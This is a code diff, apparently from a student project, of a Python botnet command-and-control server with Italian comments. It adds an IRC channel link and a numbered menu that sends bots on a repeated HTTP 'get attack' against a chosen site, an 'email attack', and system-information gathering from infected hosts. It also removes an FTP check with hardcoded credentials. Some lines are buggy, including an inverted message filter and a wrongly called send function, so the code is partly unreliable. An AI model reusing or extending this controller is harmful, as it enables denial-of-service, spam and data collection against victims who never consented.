@@ -9,10 +9,25 @@ from time import sleep
 import requests
 
 
+def sendMessage(s, message):
+    s.send(bytes(f"{message}\r\n", "UTF-8"))
+
+
+def readMessage(s):
+    buff = s.recv(2048).decode("UTF-8")
+    message = buff.split("\r\n")
+    for m in message:
+        if m.strip() != "":
+            continue
+        if m.startswith("PING"):
+            sendMessage(s, "PONG :botnet.sicurezza.com")
+
 class CC:
     # lista dei bot attivi con le relative porte
     activeBotSM = True
     activeBot = {}
+    newMessage = False
+    ircMessage = ""
 
     # costruttore
     def __init__(self):
@@ -58,6 +73,21 @@ class CC:
             conn.close()
             s.close()
 
+    def irc(self):
+        NICKNAME = "CC"
+        CHANNEL = "#botnet"
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect(("127.0.0.1", 6697))
+            s.send(bytes(f"NICK {NICKNAME}\r\n", "UTF-8"))
+            s.send(bytes(f"USER {NICKNAME} {NICKNAME} {NICKNAME} :{NICKNAME}:\r\n", "UTF-8"))
+            sendMessage(s, f"JOIN {CHANNEL}:\r\n")
+
+            sendMessage(s, "PRIVMSG "+CHANNEL+" :","Prova")
+        except Exception as e:
+            print("IRC error:", e)
+
+
     def checkBot(self):
         print("Controllo bot attivi...")
         rm = []
@@ -71,15 +101,6 @@ class CC:
             except Exception as e:
                 print(k, " is not reachable over http port.")
                 del self.activeBot[k]['http']
-            try:
-                url = k,":",str(v['ftp'])
-                ftp = FTP()
-                ftp.connect(k,v['ftp'], timeout=10)
-                ftp.login("CC","Sicurezza")
-                ftp.close()
-            except Exception as e:
-                print(k, " is not reachable over ftp port.")
-                del self.activeBot[k]['ftp']
             if len(self.activeBot[k]) == 2:
                 del self.activeBot[k]
         print("Controllo terminato")
@@ -199,81 +220,61 @@ class CC:
     def command(self, event):
         sleep(1)
         while (True):
+            print("\n---------------Command list:---------------\n"
+                  "\t1) Show active bot\n"
+                  "\t2) Show active bot a their status\n"
+                  "\t3) Execute a get attack\n"
+                  "\t4) Get info about bot\n"
+                  "\t5) Email attack\n"
+                  "\t6) Stop all attacks\n"
+                  "\t7) Check bot service\n"
+                  "\t8) Stop CC\n")
             comando = input("C&C@command: ")
             #Ferma il server
-            if comando == "stop":
-                event.set()
-                return
-            #Mostra la lista di tutti i bot attivi
-            elif comando == "ls":
-                print("Ip\t\thttp\t\tftp")
-                for k, v in self.activeBot.items():
-                    print(f"{k}\t{v['http']}\t\t{v['ftp']}")
-            #Mostra la lista di tutti i bot attivi ed il relativo stato
-            elif comando == "ls -s":
-                print("Ip\t\thttp\t\tftp\t\ttarget\t\t\t\taction")
-                for k, v in self.activeBot.items():
-                    print(f"{k}\t{v['http']}\t\t{v['ftp']}\t\t{v['target']}\t\t{v['action']}")
-            #Comando per eseguire un'attacco http ad un determinato server
-            elif comando.startswith("get"):
-                c = comando.split(" ")
-                if len(c) == 1 or len(c) == 2:
-                    print("Command not found")
-                if c[3] == "all":
-                    self.makeHTTPRequest(c[1], time=c[2])
-                elif c[3] in self.activeBot:
-                    self.makeHTTPRequest(c[1], time=c[2], target=c[3])
-                else:
-                    print("Command not found. Correct command [get [server] [time(int)(-1 for infinite attack)] [all | target(ip)]]")
-            #Comando per fermare tutti gli attacchi
-            elif comando.startswith("stop"):
-                c = comando.split(" ")
-                if len(c) == 1:
-                    print("Command not found")
-                if c[1] == "all":
-                    self.stopAttack()
-                elif c[1] in self.activeBot:
-                    self.makeHTTPRequest(target=c[1])
-                else:
-                    print("Command not found. Correct command [stop [all | target(ip)]]")
-            #Comando per acquisire informazioni sul sistema che ospita il bot
-            elif comando.startswith("info"):
-                c = comando.split(" ")
-                if len(c) == 1 :
-                    print("Command not found. Correct command [info [all | target(ip)]]")
-                elif c[1] == "all":
-                    self.getSystemInfo()
-                else:
-                    if c[1] in self.activeBot:
-                        self.getSystemInfo(target=c[1])
+            match int(comando):
+                case 1:
+                    print("Ip\t\thttp\t\tirc")
+                    for k, v in self.activeBot.items():
+                        print(f"{k}\t{v['http']}\t\t{v['irc']}")
+                case 2:
+                    print("Ip\t\thttp\t\tirc\t\ttarget\t\t\t\taction")
+                    for k, v in self.activeBot.items():
+                        print(f"{k}\t{v['http']}\t\t{v['irc']}\t\t{v['target']}\t\t{v['action']}")
+                case 3:
+                    site = input("Enter site url: ")
+                    time = input("Enter number of attack(-1=infinite): ")
+                    target = input("Enter target(ip or all): ")
+                    if target == "all":
+                        self.makeHTTPRequest(site, time=int(time))
                     else:
-                        print("Command not found. Correct command [info [all | target(ip)]]")
-            #Comando per mandare email
-            elif comando.startswith("send"):
-                c = comando.split(" ")
-                if len(c) < 2:
-                    print("Command not found")
-                if c[1] == "all":
-                    self.sendEmail()
-                elif c[1] in self.activeBot:
-                    self.sendEmail(target=c[2])
-                else:
-                    print(
-                        "Command not found. Correct command [send [users (fileName)] [all | target(ip)]]")
-            #Comando per verificare la raggiungibilità dei bot
-            elif comando.startswith("ck"):
-                c = comando.split(" ")
-                if len(c) == 1:
-                    print("Command not found")
-                if c[1] == "all":
-                    self.checkBot()
-                elif c[1] in self.activeBot:
-                    self.checkBot(target=c[1])
-                else:
-                    print("Command not found. Correct command [ck [all | target(ip)]]")
-            else:
-                print("Command not found")
-                continue
+                        self.makeHTTPRequest(site, time=int(time), target=target)
+                case 4:
+                    target = input("Enter target(ip or all): ")
+                    if target == "all":
+                        self.getSystemInfo()
+                    else:
+                        self.getSystemInfo(target=target)
+                case 5:
+                    target = input("Enter target(ip or all): ")
+                    if target == "all":
+                        self.sendEmail()
+                    else:
+                        self.sendEmail(target=target)
+                case 6:
+                    target = input("Enter target(ip or all): ")
+                    if target == "all":
+                        self.stopAttack()
+                    else:
+                        self.stopAttack(target=target)
+                case 7:
+                    target = input("Enter target(ip or all): ")
+                    if target == "all":
+                        self.checkBot()
+                    else:
+                        self.checkBot(target=target)
+                case 8:
+                    event.set()
+                    return
     # load activeBot from file
 
     def loadData(self):
